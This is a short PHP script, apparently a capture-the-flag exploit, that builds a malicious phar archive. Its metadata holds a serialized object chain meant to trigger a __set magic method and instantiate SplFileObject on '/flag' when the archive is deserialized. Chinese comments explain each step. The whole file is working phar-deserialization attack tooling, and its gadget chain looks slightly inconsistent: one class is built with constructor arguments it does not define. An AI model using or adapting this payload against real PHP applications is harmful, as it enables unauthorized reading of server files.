<?php
class air{
    public $p;
    public function __set($p, $value) {
        $p = $this->p->act;
        echo new $p($value);
    }
}

class tree{
    public $name;
    public $act="aaa";

}

$a = new tree();
$b = new air("SplFileObject","/flag");
$a->name = $b;
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata([0=>$a,1=>NULL]);    //将自定义的$a存入meta-data,最后被反序列化
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>